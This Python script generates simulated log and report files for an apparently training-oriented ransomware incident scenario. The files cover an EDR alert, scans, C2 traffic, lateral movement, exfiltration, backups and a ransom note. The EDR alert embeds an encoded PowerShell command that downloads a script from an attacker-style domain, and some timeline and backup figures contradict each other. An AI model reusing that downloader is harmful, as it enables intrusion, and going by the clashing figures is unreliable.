#!/usr/bin/env python3
"""
Generate realistic artifact files for the ransomware incident scenario.
This creates text files with realistic content and attempts to create images/PDFs.
"""
import os
from pathlib import Path
from datetime import datetime, timedelta

ARTIFACTS_DIR = Path(__file__).parent / "artifacts"
ARTIFACTS_DIR.mkdir(exist_ok=True)

def create_edr_alert():
    """Create realistic EDR alert log."""
    content = """CrowdStrike Falcon EDR Alert Report
==========================================
Alert ID: CS-2024-0115-082347
Timestamp: 2024-01-15 08:17:23 UTC
Hostname: WS-FIN-042
Domain: CORP.LOCAL
User: finance.user@corp.local

ALERT: Suspicious PowerShell Execution
Severity: HIGH
Confidence: 95%

Process Details:
----------------
Process Name: powershell.exe
Process ID: 4829
Parent Process: mshta.exe (PID: 4712)
Command Line: powershell.exe -NoProfile -NonInteractive -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAcwA6AC8ALwBzAGUAYwB1AHIAZQAtAGkAbgB2AG8AaQBjAGUALQBkAG8AdwBuAGwAbwBhAGQALgB0AGsALwBkAG8AdwBuAGwAbwBhAGQALgBwAHMAMQA=
File Path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
File Hash (SHA256): 7a8f3b2c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b

Detection Details:
------------------
Technique: T1059.001 (Command and Scripting Interpreter: PowerShell)
Tactic: Execution
Indicator: Encoded PowerShell command detected
Base64 Decoded: Invoke-WebRequest -Uri https://secure-invoice-download.tk/download.ps1

Network Activity:
-----------------
Outbound Connection Detected:
  Destination IP: 185.220.101.45
  Destination Port: 443
  Protocol: HTTPS
  Connection Time: 08:17:25 UTC
  Data Transferred: 2.3 MB

Process Tree:
-------------
mshta.exe (PID: 4712)
  └── powershell.exe (PID: 4829)
      └── cmd.exe (PID: 4831)
          └── whoami.exe (PID: 4832)
          └── net.exe (PID: 4833)
          └── ipconfig.exe (PID: 4834)

File System Activity:
---------------------
Files Created:
  C:\\Users\\finance.user\\AppData\\Local\\Temp\\invoice_download.ps1
  C:\\Users\\finance.user\\AppData\\Local\\Temp\\payload.dll

Registry Modifications:
------------------------
HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
  Value: "UpdateCheck" = "C:\\Users\\finance.user\\AppData\\Local\\Temp\\payload.dll"

Recommendation: Isolate host immediately and begin forensic investigation.
"""
    with open(ARTIFACTS_DIR / "edr_alert_phase1.txt", 'w') as f:
        f.write(content)
    print("Created: edr_alert_phase1.txt")

def create_nmap_scan():
    """Create realistic Nmap scan output."""
    content = """Nmap 7.94 scan initiated Mon Jan 15 10:30:00 2024 as: nmap -sS -sV -O -p- 192.168.0.0/24
Nmap scan report for 192.168.0.0/24
Host is up (0.002s latency).

Nmap scan report for DC-01.corp.local (192.168.0.10)
Host is up (0.001s latency).
Not shown: 65525 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 10.0.17763
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-15 10:30:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: CORP, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  Windows Server 2019 Datacenter 17763 microsoft-ds
464/tcp   open  kpasswd5?
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 00:0C:29:AB:CD:EF (VMware)
Device type: general purpose
Running: Microsoft Windows 2016|10|2019
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 1 hop

Nmap scan report for FS-01.corp.local (192.168.0.20)
Host is up (0.002s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 00:0C:29:12:34:56 (VMware)
Device type: general purpose
Running: Microsoft Windows 2019
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 1 hop

Nmap scan report for FS-02.corp.local (192.168.0.21)
Host is up (0.002s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 00:0C:29:78:90:AB (VMware)
Device type: general purpose
Running: Microsoft Windows 2019
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 1 hop

Nmap scan report for BACKUP-01.corp.local (192.168.0.30)
Host is up (0.003s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 00:0C:29:CD:EF:12 (VMware)
Device type: general purpose
Running: Microsoft Windows 2019
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 1 hop

Service Info: OSs: Windows, Windows Server 2019; CPE: cpe:/o:microsoft:windows

Nmap done: 256 IP addresses (4 hosts up) scanned in 45.23 seconds
"""
    with open(ARTIFACTS_DIR / "nmap_scan_phase2.txt", 'w') as f:
        f.write(content)
    print("Created: nmap_scan_phase2.txt")

def create_c2_traffic():
    """Create realistic C2 traffic analysis."""
    content = """Network Traffic Analysis Report - C2 Communication
==========================================================
Analysis Period: 2024-01-15 08:17:00 - 14:17:00 UTC
Analyst: Security Operations Center
Tool: Zeek (Bro) Network Analysis Framework

EXECUTIVE SUMMARY
-----------------
Suspicious outbound HTTPS traffic detected from compromised host WS-FIN-042 
(192.168.0.42) to external IP address 185.220.101.45. Traffic patterns indicate 
command and control (C2) communication with beaconing behavior.

CONNECTION DETAILS
------------------
Source IP: 192.168.0.42 (WS-FIN-042.corp.local)
Destination IP: 185.220.101.45
Destination Port: 443 (HTTPS)
Protocol: TCP/TLS 1.3
Total Connections: 73
Total Bytes Transferred: 2,456,789 bytes (outbound), 1,234,567 bytes (inbound)
Duration: 6 hours

DNS ANALYSIS
------------
DNS queries observed:
  Query: update-check.tk
  Type: A
  Response: 185.220.101.45
  TTL: 300 seconds
  Frequency: Every 5 minutes (beacon interval)

  Query: secure-invoice-download.tk
  Type: A
  Response: 45.146.164.110
  TTL: 300 seconds
  Frequency: Initial connection only

TLS HANDSHAKE ANALYSIS
-----------------------
TLS Version: 1.3
Cipher Suite: TLS_AES_256_GCM_SHA384
Server Certificate:
  Subject: CN=update-check.tk
  Issuer: Let's Encrypt
  Valid: 2024-01-01 to 2024-04-01
  SAN: update-check.tk, www.update-check.tk

BEACONING PATTERN
-----------------
Beacon Interval: 300 seconds (5 minutes)
Pattern: Consistent, periodic
First Beacon: 2024-01-15 08:17:25 UTC
Last Beacon: 2024-01-15 14:17:25 UTC
Beacon Count: 73

Beacon Characteristics:
- Small outbound payload: ~500-1000 bytes
- Small inbound payload: ~200-500 bytes
- Connection maintained: Persistent (keep-alive)
- Timing: Highly regular (300s ± 2s)

DATA TRANSFER PATTERNS
-----------------------
Phase 1 (08:17-10:00): Initial beaconing, small transfers
Phase 2 (10:00-12:00): Increased activity, larger payloads
Phase 3 (12:00-14:17): Sustained data transfer, irregular patterns

PEAK TRANSFER PERIODS
---------------------
10:45:00 - 11:15:00 UTC: 45 MB transferred
12:30:00 - 13:00:00 UTC: 67 MB transferred
13:45:00 - 14:15:00 UTC: 89 MB transferred

INDICATORS OF COMPROMISE (IOCs)
--------------------------------
IP Address: 185.220.101.45
Domain: update-check.tk
Domain: secure-invoice-download.tk
File Hash (downloaded): 7a8f3b2c1d4e5f6a7b8c9d0e1f2a3b4c
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

RECOMMENDATION
--------------
Immediate action required:
1. Block outbound connections to 185.220.101.45
2. Isolate host WS-FIN-042 from network
3. Begin forensic investigation
4. Review all systems that communicated with WS-FIN-042
"""
    with open(ARTIFACTS_DIR / "c2_traffic_phase2.txt", 'w') as f:
        f.write(content)
    print("Created: c2_traffic_phase2.txt")

def create_privilege_escalation():
    """Create realistic Windows event logs."""
    content = """Windows Security Event Log Analysis
=====================================
Log Source: DC-01.corp.local
Time Range: 2024-01-15 10:45:00 - 10:46:00 UTC
Analyst: Incident Response Team

Event ID: 4624 - An account was successfully logged on
------------------------------------------------------
Time: 2024-01-15 10:45:23.456 UTC
Subject:
  Security ID: S-1-5-18
  Account Name: DC-01$
  Account Domain: CORP
  Logon ID: 0x3E7

Logon Information:
  Logon Type: 3 (Network)
  Restricted Admin Mode: -
  Virtual Account: No
  Elevated Token: Yes

Impersonation Level: Impersonation

New Logon:
  Security ID: S-1-5-21-1234567890-123456789-123456789-1105
  Account Name: svc_backup
  Account Domain: CORP
  Logon ID: 0x1234567890ABCDEF
  Logon GUID: {00000000-0000-0000-0000-000000000000}

Process Information:
  Process ID: 0x1234
  Process Name: C:\\Windows\\System32\\lsass.exe

Network Information:
  Workstation Name: WS-FIN-042
  Source Network Address: 192.168.0.42
  Source Port: 49152

Detailed Authentication Information:
  Logon Process: NtLmSsp
  Authentication Package: NTLM
  Transited Services: -
  Package Name (NTLM only): NTLM V2
  Key Length: 128

This event is generated when a logon session is created. It is generated on the 
computer that was accessed.

Event ID: 4672 - Special privileges assigned to new logon
----------------------------------------------------------
Time: 2024-01-15 10:45:24.123 UTC
Subject:
  Security ID: S-1-5-21-1234567890-123456789-123456789-1105
  Account Name: svc_backup
  Account Domain: CORP
  Logon ID: 0x1234567890ABCDEF

Privileges: SeBackupPrivilege
            SeRestorePrivilege
            SeDebugPrivilege
            SeTakeOwnershipPrivilege
            SeLoadDriverPrivilege
            SeSecurityPrivilege
            SeSystemtimePrivilege
            SeShutdownPrivilege

Event ID: 5145 - A network share object was accessed
-----------------------------------------------------
Time: 2024-01-15 10:45:25.789 UTC
Subject:
  Security ID: S-1-5-21-1234567890-123456789-123456789-1105
  Account Name: svc_backup
  Account Domain: CORP
  Logon ID: 0x1234567890ABCDEF

Object:
  Object Server: LanmanServer
  Object Type: File
  Object Name: \\DC-01\\SYSVOL\\corp.local\\Policies
  Handle ID: 0x5678

Process Information:
  Process ID: 0x9ABC
  Process Name: C:\\Windows\\System32\\svchost.exe

Access Request Information:
  Accesses: ReadData (or ListDirectory)
            WriteData (or AddFile)
            AppendData (or AddSubdirectory or CreatePipeInstance)
            ReadEA
            WriteEA
            ReadAttributes
            WriteAttributes
            Delete
            ReadControl
            WriteDac
            WriteOwner
            Synchronize

Accesses: SYNCHRONIZE
          ReadData (or ListDirectory)
          WriteData (or AddFile)
          AppendData (or AddSubdirectory or CreatePipeInstance)
          ReadEA
          WriteEA
          ReadAttributes
          WriteAttributes
          Delete
          ReadControl
          WriteDac
          WriteOwner

ANALYSIS NOTES
--------------
- Credentials for svc_backup account appear to have been harvested from memory
- Account has excessive privileges (backup/restore/debug)
- Immediate access to SYSVOL share suggests credential theft
- Lateral movement likely to follow
- Recommend: Immediately rotate svc_backup credentials and review all access
"""
    with open(ARTIFACTS_DIR / "privilege_escalation_phase3.txt", 'w') as f:
        f.write(content)
    print("Created: privilege_escalation_phase3.txt")

def create_lateral_movement():
    """Create realistic SIEM correlation."""
    content = """SIEM Correlation Alert: Lateral Movement Detected
==================================================
Alert ID: SIEM-2024-0115-104512
Severity: CRITICAL
Confidence: 98%
Time: 2024-01-15 10:45:12 UTC

ATTACK CHAIN SUMMARY
--------------------
Source: WS-FIN-042 (192.168.0.42)
Technique: Pass-the-Hash (T1550.002)
Objective: Lateral movement to file servers and backup systems
Status: ACTIVE

DETECTED ACTIVITIES
-------------------

1. FS-01 (192.168.0.20) - File Server 01
   -------------------------------------
   First Access: 2024-01-15 10:46:12 UTC
   Authentication Method: NTLM Pass-the-Hash
   Account Used: CORP\\svc_backup
   Logon Type: 3 (Network)
   
   Shares Accessed:
   - \\FS-01\\Finance
     * Files Enumerated: 1,234 files
     * Directories: 45
     * Total Size: 12.5 GB
     * Access Pattern: Sequential enumeration
   
   Files Accessed:
   - \\FS-01\\Finance\\Q4_Financials.xlsx (READ)
   - \\FS-01\\Finance\\Budget_2024.xlsx (READ)
   - \\FS-01\\Finance\\Payroll_Data.db (READ)
   - \\FS-01\\Finance\\Vendor_Contracts\\* (READ - 156 files)
   
   SMB Commands Observed:
   - SMB2_CREATE (file open)
   - SMB2_READ (data read)
   - SMB2_QUERY_INFO (metadata enumeration)
   - SMB2_FIND (directory listing)

2. FS-02 (192.168.0.21) - File Server 02
   -------------------------------------
   First Access: 2024-01-15 10:52:33 UTC
   Authentication Method: NTLM Pass-the-Hash
   Account Used: CORP\\svc_backup
   Logon Type: 3 (Network)
   
   Shares Accessed:
   - \\FS-02\\HR
     * Files Enumerated: 856 files
     * Directories: 23
     * Total Size: 8.2 GB
   
   - \\FS-02\\HR\\PII
     * Files Enumerated: 342 files
     * Directories: 12
     * Total Size: 4.1 GB
     * Classification: HIGHLY SENSITIVE
   
   Files Accessed:
   - \\FS-02\\HR\\PII\\Employee_Records.db (READ)
   - \\FS-02\\HR\\PII\\SSN_Database.xlsx (READ)
   - \\FS-02\\HR\\PII\\Medical_Records\\* (READ - 89 files)
   - \\FS-02\\HR\\PII\\Background_Checks\\* (READ - 67 files)

3. FS-01 - Research & Development Share
   ------------------------------------
   Access Time: 2024-01-15 11:08:47 UTC
   Share: \\FS-01\\R&D\\Proprietary
   
   Files Accessed:
   - \\FS-01\\R&D\\Proprietary\\Algorithm_Source.zip (READ - 450 MB)
   - \\FS-01\\R&D\\Proprietary\\Patent_Applications\\* (READ - 23 files)
   - \\FS-01\\R&D\\Proprietary\\Research_Data\\* (READ - 156 files)
   
   Classification: INTELLECTUAL PROPERTY - CONFIDENTIAL

4. BACKUP-01 (192.168.0.30) - Backup Server
   -----------------------------------------
   First Access: 2024-01-15 11:15:47 UTC
   Authentication Method: NTLM Pass-the-Hash
   Account Used: CORP\\svc_backup
   Logon Type: 3 (Network)
   
   Shares Accessed:
   - \\BACKUP-01\\Backups
     * Files Enumerated: 2,109 files
     * Directories: 78
     * Total Size: 1.2 TB
   
   Backup Sets Accessed:
   - System_Backup_2024-01-14 (READ)
   - Database_Backup_2024-01-14 (READ)
   - FileServer_Backup_2024-01-14 (READ)

TIMELINE
--------
10:45:23 - Initial authentication to DC-01 (privilege escalation)
10:46:12 - First access to FS-01
10:52:33 - First access to FS-02
11:08:47 - Access to R&D proprietary data
11:15:47 - Access to backup systems
11:30:00 - Data exfiltration begins

INDICATORS
----------
- Consistent use of svc_backup account across all systems
- Pass-the-hash technique (no password required)
- Systematic enumeration pattern
- Focus on sensitive data (PII, financial, IP)
- Backup system access suggests preparation for encryption attack

RECOMMENDED ACTIONS
-------------------
1. IMMEDIATE: Revoke svc_backup account credentials
2. Isolate FS-01, FS-02, and BACKUP-01 from network
3. Review all file access logs for data theft
4. Check for data exfiltration to external IPs
5. Prepare for potential ransomware deployment
"""
    with open(ARTIFACTS_DIR / "lateral_movement_phase3.txt", 'w') as f:
        f.write(content)
    print("Created: lateral_movement_phase3.txt")

def create_exfiltration_traffic():
    """Create realistic exfiltration analysis."""
    content = """Network Flow Analysis: Large-Scale Data Exfiltration
==========================================================
Analysis Period: 2024-01-15 11:00:00 - 17:00:00 UTC
Tool: NetFlow Analyzer v3.2
Analyst: Network Security Team

EXECUTIVE SUMMARY
-----------------
Massive data exfiltration detected from internal file servers to external 
command and control infrastructure. Total data transferred: ~450 GB over 6-hour 
period. Traffic patterns indicate automated bulk transfer using cloud storage APIs.

SOURCE SYSTEMS
--------------
- FS-01 (192.168.0.20) - File Server 01
- FS-02 (192.168.0.21) - File Server 02

DESTINATION INFRASTRUCTURE
--------------------------
Primary C2 Server:
  IP: 185.220.101.45
  Port: 443 (HTTPS)
  Data Received: 270 GB

Secondary C2 Server:
  IP: 45.146.164.110
  Port: 443 (HTTPS)
  Data Received: 180 GB

TRANSFER BREAKDOWN BY TIME PERIOD
---------------------------------

Period 1: 11:00:00 - 13:00:00 UTC (2 hours)
  Source: FS-01
  Destination: 185.220.101.45
  Data Transferred: 150 GB
  Transfer Rate: 75 GB/hour
  Connections: 45 concurrent
  Method: HTTPS POST requests to cloud storage API

Period 2: 13:00:00 - 15:00:00 UTC (2 hours)
  Source: FS-02
  Destination: 45.146.164.110
  Data Transferred: 180 GB
  Transfer Rate: 90 GB/hour
  Connections: 52 concurrent
  Method: HTTPS POST requests to cloud storage API

Period 3: 15:00:00 - 17:00:00 UTC (2 hours)
  Source: FS-01
  Destination: 185.220.101.45
  Data Transferred: 120 GB
  Transfer Rate: 60 GB/hour
  Connections: 38 concurrent
  Method: HTTPS POST requests to cloud storage API

FILE TYPE ANALYSIS
------------------
Based on transfer patterns and file extensions observed:

Database Files (.db, .mdb, .sqlite):
  Volume: 45 GB
  Estimated Records: 2.5 million
  Types: Customer databases, employee records, financial data

Spreadsheet Files (.xlsx, .xls, .csv):
  Volume: 120 GB
  Estimated Files: 15,000+
  Types: Financial reports, payroll, vendor data, budgets

Document Files (.pdf, .docx, .doc):
  Volume: 85 GB
  Estimated Files: 8,500+
  Types: Contracts, legal documents, NDAs, policies

Archive Files (.zip, .rar, .7z):
  Volume: 105 GB
  Estimated Archives: 2,100+
  Types: Compressed data, source code, backups

Other Files:
  Volume: 95 GB
  Types: Images, configurations, logs, miscellaneous

CLOUD STORAGE API DETECTION
----------------------------
User-Agent Strings Observed:
  - "MegaClient/1.0"
  - "DropboxDesktopClient/150.4.4090"
  - Custom: "DataSync/2.1"

API Endpoints Called:
  - api.mega.nz/file/upload
  - content.dropboxapi.com/2/files/upload
  - storage.googleapis.com/upload/storage/v1/b

TRAFFIC CHARACTERISTICS
-----------------------
- Encrypted (TLS 1.3)
- Large payload sizes (10-50 MB per request)
- Sustained transfer rate
- Multiple concurrent connections
- Burst patterns during peak hours

PEAK TRANSFER PERIODS
---------------------
11:30:00 - 11:45:00 UTC: 25 GB transferred (FS-01)
13:15:00 - 13:30:00 UTC: 30 GB transferred (FS-02)
15:00:00 - 15:15:00 UTC: 20 GB transferred (FS-01)

IMPACT ASSESSMENT
-----------------
Data Categories Exfiltrated:
  ✓ Customer PII: ~125,000 records
  ✓ Employee Data: ~2,400 records
  ✓ Financial Records: Q1-Q4 2023, Q1 2024
  ✓ Intellectual Property: Proprietary algorithms, research data
  ✓ Legal Documents: Contracts, NDAs, compliance records
  ✓ System Backups: Recent backup sets

Regulatory Implications:
  - GDPR: Potential violation (EU customer data)
  - CCPA: Notification required (California residents)
  - HIPAA: Potential violation if healthcare data included
  - PCI-DSS: Potential violation if payment card data included

BUSINESS IMPACT
---------------
Estimated Value of Exfiltrated Data: $50+ million
Potential Regulatory Fines: $5-25 million
Reputation Damage: Severe
Competitive Disadvantage: High (IP theft)

RECOMMENDATION
--------------
1. IMMEDIATE: Block outbound connections to C2 IPs
2. Isolate affected file servers
3. Begin forensic investigation
4. Prepare data breach notification
5. Engage legal and compliance teams
6. Monitor for data publication on leak sites
"""
    with open(ARTIFACTS_DIR / "exfiltration_traffic_phase4.txt", 'w') as f:
        f.write(content)
    print("Created: exfiltration_traffic_phase4.txt")

def create_backup_status():
    """Create realistic backup status report."""
    content = """Backup System Status Report
============================
Report Generated: 2024-01-15 10:30:00 UTC
System: Veeam Backup & Replication v12.0
Administrator: backup.admin@corp.local

BACKUP SERVER STATUS
--------------------
Server Name: BACKUP-01.corp.local
IP Address: 192.168.0.30
Status: ENCRYPTED (as of 2024-01-15 10:00:00 UTC)
Last Successful Backup: 2024-01-15 08:00:00 UTC
Encryption Detected: 2024-01-15 10:00:00 UTC

ONSITE BACKUP STORAGE
---------------------
Location: BACKUP-01 (Onsite)
Status: ENCRYPTED
Storage Type: Network Attached Storage (NAS)
Total Capacity: 50 TB
Used Capacity: 42 TB (84%)
Available: 8 TB

Backup Sets:
  - System_Backup_2024-01-15_08-00-00: ENCRYPTED
  - Database_Backup_2024-01-15_08-00-00: ENCRYPTED
  - FileServer_Backup_2024-01-15_08-00-00: ENCRYPTED
  - Application_Backup_2024-01-15_08-00-00: ENCRYPTED

Recovery: NOT POSSIBLE - All backup files encrypted by ransomware

OFFSITE BACKUP STORAGE
----------------------
Location: Secure Offsite Facility (Cloud)
Status: INTACT
Storage Provider: AWS S3 (encrypted at rest)
Total Capacity: Unlimited
Used Capacity: 38 TB

Last Successful Backup: 2024-01-14 20:00:00 UTC
Backup Frequency: Every 12 hours
Retention Policy: 30 days

Backup Sets Available:
  ✓ System_Backup_2024-01-14_20-00-00: INTACT (38 hours old)
  ✓ Database_Backup_2024-01-14_20-00-00: INTACT (38 hours old)
  ✓ FileServer_Backup_2024-01-14_20-00-00: INTACT (38 hours old)
  ✓ Application_Backup_2024-01-14_20-00-00: INTACT (38 hours old)
  ✓ System_Backup_2024-01-14_08-00-00: INTACT (50 hours old)
  ✓ Previous backups available going back 30 days

BACKUP COVERAGE ANALYSIS
------------------------
Critical Systems Coverage: 95%
  ✓ Domain Controllers: 2/2 backed up
  ✓ File Servers: 15/15 backed up
  ✓ Application Servers: 8/8 backed up
  ✓ Database Servers: 5/5 backed up
  ✓ Web Servers: 3/3 backed up

User Data Coverage: 80%
  ✓ User Home Directories: 80% coverage
  ✓ Shared Drives: 95% coverage
  ✓ Email Archives: 90% coverage
  ⚠ Desktop Files: 60% coverage (not all users included)

Application Data Coverage: 90%
  ✓ ERP System: Backed up
  ✓ CRM System: Backed up
  ✓ Email Server: Backed up
  ⚠ Development Servers: 70% coverage

RECOVERY METRICS
----------------
Recovery Point Objective (RPO): 36 hours
  - Maximum acceptable data loss: 36 hours
  - Current backup age: 38 hours (within RPO)

Recovery Time Objective (RTO): 48 hours
  - Target recovery time: 48 hours
  - Estimated actual recovery time: 48-72 hours

Data Loss Window: 36 hours maximum
  - Last backup: 2024-01-14 20:00:00 UTC
  - Encryption detected: 2024-01-15 10:00:00 UTC
  - Data loss: 14 hours of new/changed data

RECOVERY PROCEDURE
------------------
Step 1: Verify offsite backup integrity
Step 2: Provision recovery infrastructure
Step 3: Restore domain controllers (estimated: 4 hours)
Step 4: Restore file servers (estimated: 12 hours)
Step 5: Restore application servers (estimated: 8 hours)
Step 6: Restore databases (estimated: 6 hours)
Step 7: Restore user data (estimated: 18 hours)
Step 8: Verify system functionality (estimated: 4 hours)

Total Estimated Recovery Time: 48-72 hours

CHALLENGES
----------
- Large data volumes (38 TB to restore)
- Network bandwidth limitations
- Verification of backup integrity required
- Potential for additional encrypted systems
- User communication and expectation management

RECOMMENDATION
--------------
Proceed with offsite backup restoration. Recovery is feasible within RTO window.
However, 36 hours of data changes will be lost. Consider:
1. Immediate restoration from offsite backups
2. Parallel investigation into attack vector
3. Enhanced monitoring during recovery
4. User communication regarding data loss window
"""
    with open(ARTIFACTS_DIR / "backup_status_phase5.txt", 'w') as f:
        f.write(content)
    print("Created: backup_status_phase5.txt")

def create_image_placeholder(filename, title, description):
    """Create a simple image using PIL if available."""
    try:
        from PIL import Image, ImageDraw, ImageFont
        img = Image.new('RGB', (800, 600), color='#f0f0f0')
        draw = ImageDraw.Draw(img)
        
        # Try to use a font, fallback to default
        try:
            font_large = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 32)
            font_medium = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 18)
        except:
            font_large = ImageFont.load_default()
            font_medium = ImageFont.load_default()
        
        # Draw title
        draw.text((400, 200), title, fill='black', font=font_large, anchor='mm')
        
        # Draw description (wrapped)
        words = description.split()
        lines = []
        current_line = []
        for word in words:
            test_line = ' '.join(current_line + [word])
            bbox = draw.textbbox((0, 0), test_line, font=font_medium)
            if bbox[2] - bbox[0] < 700:
                current_line.append(word)
            else:
                if current_line:
                    lines.append(' '.join(current_line))
                current_line = [word]
        if current_line:
            lines.append(' '.join(current_line))
        
        y_offset = 280
        for line in lines[:8]:  # Limit to 8 lines
            draw.text((400, y_offset), line, fill='#333', font=font_medium, anchor='mm')
            y_offset += 30
        
        img.save(ARTIFACTS_DIR / filename)
        print(f"Created image: {filename}")
    except ImportError:
        # Fallback: create text file
        with open(ARTIFACTS_DIR / filename, 'w') as f:
            f.write(f"{title}\n\n{description}\n\n")
            f.write("(This is a placeholder. Install Pillow to generate actual images: pip install Pillow)\n")
        print(f"Created text placeholder: {filename} (install Pillow for images)")

def create_pdf_placeholder(filename, title, content):
    """Create a PDF using reportlab if available."""
    try:
        from reportlab.lib.pagesizes import letter
        from reportlab.pdfgen import canvas
        from reportlab.lib.units import inch
        
        filepath = ARTIFACTS_DIR / filename
        c = canvas.Canvas(str(filepath), pagesize=letter)
        width, height = letter
        
        # Title
        c.setFont("Helvetica-Bold", 20)
        c.drawString(1*inch, height - 1*inch, title)
        
        # Content
        c.setFont("Helvetica", 12)
        y = height - 1.5*inch
        lines = content.split('\n')
        for line in lines[:40]:  # Limit lines per page
            if y < 1*inch:
                c.showPage()
                y = height - 1*inch
            c.drawString(1*inch, y, line)
            y -= 0.25*inch
        
        c.save()
        print(f"Created PDF: {filename}")
    except ImportError:
        # Fallback: create text file
        with open(ARTIFACTS_DIR / filename, 'w') as f:
            f.write(f"{title}\n\n{content}\n\n")
            f.write("(This is a placeholder. Install reportlab to generate actual PDFs: pip install reportlab)\n")
        print(f"Created text placeholder: {filename} (install reportlab for PDFs)")

if __name__ == "__main__":
    print("Generating realistic artifact files...")
    print(f"Artifacts directory: {ARTIFACTS_DIR}\n")
    
    # Create text files
    create_edr_alert()
    create_nmap_scan()
    create_c2_traffic()
    create_privilege_escalation()
    create_lateral_movement()
    create_exfiltration_traffic()
    create_backup_status()
    
    # Create image placeholders
    create_image_placeholder(
        "phishing_email_phase1.png",
        "Phishing Email Screenshot",
        "URGENT: Invoice Payment Required - Action Needed\n\nFrom: vendor-support@legitmate-vendor.com\nTo: finance.user@corp.local\n\nClick here to download invoice: secure-invoice-download.tk"
    )
    
    create_image_placeholder(
        "ransomware_note_phase5.png",
        "YOUR FILES HAVE BEEN ENCRYPTED",
        "LockBit 3.0 Ransomware\n\nTo decrypt your files, you must pay 50 BTC\nBitcoin Address: [REDACTED]\n\nYou have 72 hours to pay.\nAfter that, the price doubles.\n\nWe have also exfiltrated your data.\nIf you do not pay, we will publish it."
    )
    
    # Create PDF placeholders
    pdf_content = """Data Classification Report
========================

Exfiltrated Data Analysis:
- Customer PII: 125,000 records
- Employee Data: 2,400 records  
- Financial Records: Q1-Q4 2023, Q1 2024
- Intellectual Property: Proprietary algorithms, research data
- Legal Documents: Contracts, NDAs, compliance records

Regulatory Impact:
- GDPR: Potential violation
- CCPA: Notification required
- HIPAA: Potential violation
- PCI-DSS: Potential violation

Estimated Fines: $5-25 million
"""
    
    create_pdf_placeholder("data_classification_phase4.pdf", "Data Classification Report", pdf_content)
    
    impact_content = """Encryption Impact Assessment
===========================

Systems Encrypted: 200+ endpoints
- 15 file servers
- 8 application servers
- 150 workstations
- Backup system (BACKUP-01)

Critical Systems Affected:
- ERP system: OFFLINE
- Email server: PARTIAL
- Customer portal: OFFLINE

Recovery Options:
- Using backups: 48-72 hours
- Paying ransom: 2-3 weeks

Business Impact: $500K/day in lost revenue
"""
    
    create_pdf_placeholder("impact_assessment_phase5.pdf", "Encryption Impact Assessment", impact_content)
    
    print("\n✓ All artifacts generated!")
    print("\nNote: For actual PNG images and PDFs, install:")
    print("  pip install Pillow reportlab")
    print("\nThen re-run this script to generate real images/PDFs.")

